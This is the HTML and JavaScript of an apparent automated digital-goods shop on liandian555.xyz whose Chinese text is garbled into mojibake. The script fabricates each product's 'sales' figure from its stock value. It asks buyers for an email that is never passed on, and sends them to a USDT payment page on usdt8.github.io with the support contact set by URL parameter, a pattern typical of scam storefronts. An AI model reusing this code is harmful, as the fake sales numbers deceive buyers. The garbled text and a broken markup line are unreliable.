<!doctype html>
<html lang="zh-CN">
	<head>
		<meta charset="UTF-8" />
		<base href="https://liandian555.xyz/" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>é“¾ç‚¹å·é“º-è‡ªåŠ©ä¸‹å•-è‡ªåŠ¨å‘å¡</title>
		<link rel="stylesheet" href="https://liandian555.xyz/faka/css/common.css" />
		<link rel="icon" href="https://liandian555.xyz/favicon.ico" type="image/x-icon" />
		<link rel="shortcut icon" href="https://liandian555.xyz/favicon.ico" type="image/x-icon" />
		<style>
			* {
				margin: 0;
				padding: 0;
				box-sizing: border-box;
			}
			body {
				font-family: Arial, sans-serif;
				background-color: #f5f5f5;
				color: #333;
			}
			.container {
				max-width: 1200px;
				margin: 0 auto;
				padding: 20px;
			}
			.header {
				text-align: center;
				margin-bottom: 30px;
			}
			.categories {
				display: flex;
				flex-wrap: wrap;
				gap: 10px;
				margin-bottom: 20px;
				justify-content: center;
			}
			.category-btn {
				padding: 8px 16px;
				border: none;
				border-radius: 20px;
				background-color: #fff;
				cursor: pointer;
				transition: all 0.3s;
			}
			.category-btn.active {
				background-color: #007bff;
				color: #fff;
			}
			.products {
				display: grid;
				grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
				gap: 20px;
			}
			.product-card {
				background-color: #fff;
				border-radius: 10px;
				padding: 15px;
				box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
				transition: transform 0.3s;
				display: flex;
				gap: 15px;
			}
			.product-card:hover {
				transform: translateY(-5px);
			}
			.product-image-container {
				flex: 0 0 120px;
			}
			.product-image {
				width: 120px;
				height: 120px;
				object-fit: cover;
				border-radius: 5px;
			}
			.product-info {
				flex: 1;
				display: flex;
				flex-direction: column;
			}
			.product-name {
				font-size: 16px;
				margin-bottom: 10px;
				overflow: hidden;
				display: -webkit-box;
				/* -webkit-line-clamp: 2; */
				-webkit-box-orient: vertical;
			}
			.product-price {
				color: #ff6b6b;
				font-weight: bold;
				margin-bottom: 10px;
			}
			.product-sales {
				color: #666;
				font-size: 14px;
				margin-bottom: 10px;
			}
			.stock-container {
				margin-top: auto;
			}
			.stock-text {
				color: #868e96;
				font-size: 14px;
				margin-bottom: 5px;
			}
			.stock-progress {
				width: 100%;
				height: 6px;
				background-color: #e9ecef;
				border-radius: 3px;
				overflow: hidden;
			}
			.stock-bar {
				height: 100%;
				background-color: #4caf50;
				transition: width 0.3s ease;
			}
			.low-stock {
				background-color: #ff6b6b;
			}
			.medium-stock {
				background-color: #ffd43b;
			}
			.wallet-info {
				text-align: center;
				margin-bottom: 20px;
				padding: 10px;
				background-color: #fff;
				border-radius: 10px;
			}
			/* æ·»åŠ æœç´¢æ¡†æ ·å¼ */
			.search-container {
				margin: 20px auto;
				max-width: 600px;
				position: relative;
			}
			.search-box {
				width: 100%;
				padding: 12px 20px;
				border: 2px solid #e9ecef;
				border-radius: 25px;
				font-size: 16px;
				transition: all 0.3s;
				background-color: white;
			}
			.search-box:focus {
				outline: none;
				border-color: #007bff;
				box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
			}
			.search-icon {
				position: absolute;
				right: 15px;
				top: 50%;
				transform: translateY(-50%);
				color: #868e96;
			}
			/* è¿”å›é¡¶éƒ¨æŒ‰é’®æ ·å¼ */
			.back-to-top {
				position: fixed;
				bottom: 30px;
				right: 30px;
				width: 50px;
				height: 50px;
				background-color: #007bff;
				color: white;
				border-radius: 50%;
				display: none;
				justify-content: center;
				align-items: center;
				cursor: pointer;
				box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
				transition: all 0.3s;
				z-index: 1000;
			}
			.back-to-top:hover {
				background-color: #0056b3;
				transform: translateY(-3px);
			}
			@media (max-width: 768px) {
				.back-to-top {
					bottom: 20px;
					right: 20px;
					width: 40px;
					height: 40px;
				}
			}

			.category-toggle {
				display: none;
				width: 100%;
				padding: 10px;
				background: #fff;
				border: none;
				border-radius: 8px;
				text-align: left;
				cursor: pointer;
				margin-bottom: 10px;
				font-size: 16px;
				box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
			}

			@media (max-width: 768px) {
				.menu-toggle {
					display: block;
				}

				.nav-container {
					flex-direction: column;
					align-items: flex-start;
				}

				.nav-links {
					display: none;
					width: 100%;
					flex-direction: column;
					gap: 10px;
					padding: 10px 0;
				}

				.nav-links.active {
					display: flex;
				}

				.category-toggle {
					display: flex;
					align-items: center;
					justify-content: space-between;
				}

				.sidebar {
					display: none;
					width: 100%;
					position: static;
					margin-bottom: 20px;
				}

				.sidebar.active {
					display: block;
				}
			}

			/* Email Modal Styles */
			.modal-overlay {
				position: fixed;
				top: 0;
				left: 0;
				width: 100%;
				height: 100%;
				background: rgba(0, 0, 0, 0.4);
				backdrop-filter: blur(8px);
				display: none;
				justify-content: center;
				align-items: center;
				z-index: 2000;
				opacity: 0;
				transition: opacity 0.3s ease;
			}
			.modal-overlay.active {
				display: flex;
				opacity: 1;
			}
			.email-modal {
				background: white;
				padding: 30px;
				border-radius: 20px;
				width: 90%;
				max-width: 400px;
				box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
				transform: translateY(20px);
				transition: transform 0.3s ease;
				text-align: center;
			}
			.modal-overlay.active .email-modal {
				transform: translateY(0);
			}
			.email-modal h2 {
				margin-bottom: 15px;
				font-size: 22px;
				color: #1d1d1f;
			}
			.email-modal p {
				color: #6e6e73;
				margin-bottom: 25px;
				font-size: 14px;
				line-height: 1.5;
			}
			.email-input {
				width: 100%;
				padding: 14px 20px;
				border: 1px solid #d2d2d7;
				border-radius: 12px;
				font-size: 16px;
				margin-bottom: 20px;
				outline: none;
				transition: border-color 0.2s;
			}
			.email-input:focus {
				border-color: #0071e3;
				box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1);
			}
			.modal-buttons {
				display: flex;
				gap: 12px;
			}
			.modal-btn {
				flex: 1;
				padding: 12px;
				border-radius: 12px;
				border: none;
				font-weight: 600;
				cursor: pointer;
				transition: all 0.2s;
				font-size: 15px;
			}
			.btn-cancel {
				background: #f5f5f7;
				color: #1d1d1f;
			}
			.btn-continue {
				background: #0071e3;
				color: white;
			}
			.btn-continue:hover {
				background: #0077ed;
			}
			.error-tip {
				color: #ff3b30;
				font-size: 12px;
				margin-top: -15px;
				margin-bottom: 15px;
				display: none;
				text-align: left;
			}
		</style>
	</head>
	<body>
		<!-- æ·»åŠ å¯¼èˆªæ  -->
		<nav class="navbar">
			<div class="nav-container">
				<div class="nav-left">
					<h1 class="nav-title">é“¾ç‚¹å·é“º-è‡ªåŠ©ä¸‹å•-è‡ªåŠ¨å‘å¡</h1>
					<div class="menu-toggle" onclick="toggleMenu()">
						<span style="margin-top: -2px">â˜°</span>
					</div>
				</div>
				<div class="nav-links" id="navLinks">
					<a href="javascript:location.reload()" class="nav-link home-link">ä¸»é¡µ</a>
					<!--<a href="https://liandian555.xyz/orders" class="nav-link">è®¢å•æŸ¥è¯¢</a>-->
					<a id="tgLink" class="nav-link">ç”µæŠ¥å®¢æœ</a>
				</div>
			</div>
		</nav>

		<div class="container">
			<!-- æ·»åŠ åˆ†ç±»åˆ‡æ¢æŒ‰é’® -->
			<button class="category-toggle" onclick="toggleCategories()">å•†å“åˆ†ç±» <span>â–¼</span></button>

			<!-- ä¾§è¾¹æ  -->
			<div class="sidebar" id="sidebar">
				<div id="categories" class="categories">
					<!-- åˆ†ç±»æŒ‰é’®å°†é€šè¿‡ JS åŠ¨æ€ç”Ÿæˆ -->
				</div>
			</div>

			<!-- æœç´¢æ¡†æ”¾åœ¨åˆ†ç±»ä¹‹å‰ -->
			<div class="search-container">
				<input type="text" class="search-box" id="searchInput" placeholder="æœç´¢å•†å“..." oninput="handleSearch()" />
				<span class="search-icon">ğŸ”</span>
			</div>

			<div id="products" class="products">
				<!-- å•†å“å¡ç‰‡å°†é€šè¿‡ JS åŠ¨æ€ç”Ÿæˆ -->
			</div>
		</div>

		<!-- è¿”å›é¡¶éƒ¨æŒ‰é’® -->
		<div class="back-to-top" id="backToTop" onclick="scrollToTop()">â†‘</div>

		<script src="https://liandian555.xyz/faka.js?v=1.1.73"></script>
		<script>
			function getParamOrCache(key, options = {}) {
				const { storageType = 'localStorage' } = options
				const storage = window[storageType]

				// 1. ä» URL ä¸­è¯»å–
				const urlParams = new URLSearchParams(window.location.search)
				let value = urlParams.get(key)
				if (value !== null && value !== '') {
					// å¦‚æœ URL æœ‰å€¼ï¼Œæ›´æ–°ç¼“å­˜å¹¶è¿”å›
					try {
						storage.setItem(key, value)
					} catch (e) {
						console.warn(`æ— æ³•å†™å…¥ ${storageType}`, e)
					}
					return value
				}

				// 2. URL æ²¡æœ‰ï¼Œå†ä»ç¼“å­˜é‡Œå–
				try {
					value = storage.getItem(key)
				} catch (e) {
					console.warn(`æ— æ³•è¯»å– ${storageType}`, e)
					value = null
				}
				if (value !== null && value !== '') {
					return value
				}

				// 3. ç¼“å­˜ä¹Ÿæ²¡æœ‰ï¼Œè¿”å› nullï¼ˆæˆ–æŒ‰éœ€å¤„ç†ï¼‰
				return null
			}
			// document.getElementById('tgLink').href = `https://liandian555.xyz/TG.html?user=${getParamOrCache('user')}`
			// // é€‰ä¸­æ‰€æœ‰ .nav-link
			// const links = document.querySelectorAll('.home-link')
			// // éå†å¹¶ä¿®æ”¹ href
			// links.forEach((link) => {
			// 	link.href = `https://liandian555.xyz/?user=${getParamOrCache('user')}&group=${getParamOrCache('group')}`
			// })

			let currentCategory = 'all' // æ·»åŠ å…¨å±€å˜é‡è·Ÿè¸ªå½“å‰åˆ†ç±»
			// æœç´¢å¤„ç†å‡½æ•°
			function handleSearch() {
				const searchText = document.getElementById('searchInput').value.toLowerCase()
				if (searchText) {
					// æœ‰æœç´¢æ–‡æœ¬æ—¶ï¼Œæœç´¢æ‰€æœ‰å•†å“
					const searchResults = products.filter((product) => product.name.toLowerCase().includes(searchText) || product.category.toLowerCase().includes(searchText) || product.price.toLowerCase().includes(searchText))
					renderProducts(searchResults)
				} else {
					// æ— æœç´¢æ–‡æœ¬æ—¶ï¼Œæ˜¾ç¤ºå½“å‰åˆ†ç±»
					filterProducts(currentCategory)
				}
			}

			// è¿‡æ»¤åˆ†ç±»
			function filterProducts(category) {
				currentCategory = category

				// æ›´æ–°æŒ‰é’®çŠ¶æ€
				document.querySelectorAll('.category-btn').forEach((btn) => {
					btn.classList.remove('active')
					if (btn.textContent === (category === 'all' ? 'å…¨éƒ¨' : category)) {
						btn.classList.add('active')
					}
				})

				// åœ¨ç§»åŠ¨ç«¯è‡ªåŠ¨æ”¶èµ·åˆ†ç±»æ 
				if (window.innerWidth <= 768) {
					const sidebar = document.getElementById('sidebar')
					sidebar.classList.remove('active')
					const toggle = document.querySelector('.category-toggle span')
					toggle.textContent = 'â–¼'
				}

				// æ¸…ç©ºæœç´¢æ¡†
				document.getElementById('searchInput').value = ''

				// è¿‡æ»¤å¹¶æ¸²æŸ“å•†å“
				const filteredProducts = category === 'all' ? products : products.filter((product) => product.category === category)

				renderProducts(filteredProducts)
			}

			// åŠ¨æ€å¤„ç†å‚æ•°
			;(function () {
				const params = new URLSearchParams(window.location.search)
				const name = params.get('name')
				const kefu = params.get('kefu')
				const tgid = params.get('tgid')

				if (name) {
					document.title = name
					const titleEl = document.querySelector('.nav-title')
					if (titleEl) titleEl.textContent = name
				}
				// ç»Ÿä¸€å¤„ç†å®¢æœé“¾æ¥
				const tgLink = document.getElementById('tgLink')
				if (tgLink) tgLink.href = `https://t.me/${kefu}`
			})()

			let selectedProductId = null
			let selectedProductPrice = null

			// æ¸²æŸ“å•†å“åˆ—è¡¨
			function renderProducts(productList) {
				const productsContainer = document.getElementById('products')
				productsContainer.innerHTML = ''

				if (productList.length === 0) {
					productsContainer.innerHTML = '<div style="text-align: center; grid-column: 1/-1; padding: 20px; color: #868e96;">æœªæ‰¾åˆ°ç›¸å…³å•†å“</div>'
					return
				}

				productList.forEach((product) => {
					const stockPercentage = 100 - product.stock

					let stockClass = 'stock-bar'
					if (stockPercentage <= 30) {
						stockClass += ' low-stock'
					} else if (stockPercentage <= 70) {
						stockClass += ' medium-stock'
					}

					const card = document.createElement('div')
					card.className = 'product-card'
					card.style.cursor = 'pointer'

					// ç‚¹å‡»å¼¹çª—
					card.onclick = () => openEmailModal(product.id, product.price)

					card.innerHTML = `
                    <div class="product-image-container">
                        <img src="https://liandian555.xyz/${product.imageUrl}" alt="${product.name}" class="product-image">
                    </div>
                    <div class="product-info">
                        <div class="product-name">${product.name}</div>
                        <div class="product-price">ä»·æ ¼: ${product.price}</div>
                        <div class="product-sales">é”€é‡: ${Math.floor(36914 * (product.stock / 100))}</div>
                        <div class="stock-container">
                            <div class="stock-text: ${product.stock}%</div>
                            <div class="stock-progress">
                                <div class="${stockClass}" style="width: ${product.stock}%"></div>
                            </div>
                        </div>
                    </div>
                `
					productsContainer.appendChild(card)
				})
			}

			function openEmailModal(id, price) {
				selectedProductId = id
				selectedProductPrice = price
				document.getElementById('emailModal').classList.add('active')
				document.getElementById('userEmail').focus()
			}

			function closeEmailModal() {
				document.getElementById('emailModal').classList.remove('active')
				document.getElementById('emailError').style.display = 'none'
			}

			function confirmOrder() {
				const email = document.getElementById('userEmail').value
				const emailError = document.getElementById('emailError')

				// ç®€å•é‚®ç®±æ­£åˆ™
				const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
				if (!emailRegex.test(email)) {
					emailError.style.display = 'block'
					return
				}

				emailError.style.display = 'none'

				// æ„å»ºè·³è½¬é“¾æ¥
				const currentParams = new URLSearchParams(window.location.search)
				const tgid = currentParams.get('tgid')
				const kefu = currentParams.get('kefu')

				const payParams = new URLSearchParams(window.location.search)
				// ç§»é™¤ name å‚æ•°ï¼Œä¸ä¼ é€’ç»™æ”¯ä»˜é¡µé¢
				payParams.delete('name')

				// payParams.set('email', email)
				// payParams.set('id', selectedProductId)
				payParams.set('tgid', tgid)
				payParams.set('kefu', kefu)
				// å¤„ç†ä»·æ ¼ï¼Œå»æ‰ 'U' å¹¶ä¿ç•™ä¸¤ä½å°æ•°ï¼ˆå¦‚æœéœ€è¦ï¼‰
				let priceVal = parseFloat(selectedProductPrice)
				if (!isNaN(priceVal)) {
					payParams.set('vip', priceVal.toFixed(2))
				} else {
					payParams.set('vip', selectedProductPrice) // Fallback if parsing fails
				}

				window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
			}

			// è·å–æ‰€æœ‰å”¯ä¸€åˆ†ç±»
			function getUniqueCategories() {
				// è¿‡æ»¤æ‰ category ä¸º 'all' çš„å•†å“ï¼Œåªä»å®é™…åˆ†ç±»ä¸­è·å–
				const categories = new Set(products.filter((product) => product.category !== 'all').map((product) => product.category))
				return ['all', ...categories]
			}

			// æ¸²æŸ“åˆ†ç±»æŒ‰é’®
			function renderCategories() {
				const categoriesContainer = document.getElementById('categories')
				const categories = getUniqueCategories()

				categories.forEach((category) => {
					const button = document.createElement('button')
					button.className = 'category-btn'
					button.textContent = category === 'all' ? 'å…¨éƒ¨' : category
					button.onclick = () => filterProducts(category)
					if (category === 'all') button.classList.add('active')
					categoriesContainer.appendChild(button)
				})
			}

			// è¿”å›é¡¶éƒ¨åŠŸèƒ½
			window.onscroll = function () {
				toggleBackToTop()
			}

			function toggleBackToTop() {
				const button = document.getElementById('backToTop')
				if (document.body.scrollTop > 200 || document.documentElement.scrollTop > 200) {
					button.style.display = 'flex'
				} else {
					button.style.display = 'none'
				}
			}

			function scrollToTop() {
				window.scrollTo({
					top: 0,
					behavior: 'smooth',
				})
			}

			// åˆ‡æ¢å¯¼èˆªèœå•
			function toggleMenu() {
				const navLinks = document.getElementById('navLinks')
				navLinks.classList.toggle('active')
			}

			// åˆ‡æ¢åˆ†ç±»æ 
			function toggleCategories() {
				const sidebar = document.getElementById('sidebar')
				sidebar.classList.toggle('active')
				const toggle = document.querySelector('.category-toggle span')
				toggle.textContent = sidebar.classList.contains('active') ? 'â–²' : 'â–¼'
			}

			// é¡µé¢åŠ è½½å®Œæˆååˆå§‹åŒ–
			window.onload = function () {
				renderCategories()
				filterProducts('all')
				// detectPlatform();
			}
		</script>
		<!-- Email Modal -->
		<div class="modal-overlay" id="emailModal">
			<div class="email-modal">
				<h2>è¾“å…¥é‚®ç®±ç»§ç»­</h2>
				<p>æˆ‘ä»¬å°†æŠŠå¡å¯†ä¿¡æ¯å‘é€åˆ°æ‚¨çš„é‚®ç®±ï¼Œè¯·ç¡®ä¿è¾“å…¥æ­£ç¡®ã€‚</p>
				<input type="email" id="userEmail" class="email-input" placeholder="example@gmail.com" />
				<div id="emailError" class="error-tip">è¯·è¾“å…¥æœ‰æ•ˆçš„ç”µå­é‚®ç®±åœ°å€</div>
				<div class="modal-buttons">
					<button class="modal-btn btn-cancel" onclick="closeEmailModal()">å–æ¶ˆ</button>
					<button class="modal-btn btn-continue" onclick="confirmOrder()">ç»§ç»­</button>
				</div>
			</div>
		</div>
	</body>
</html>
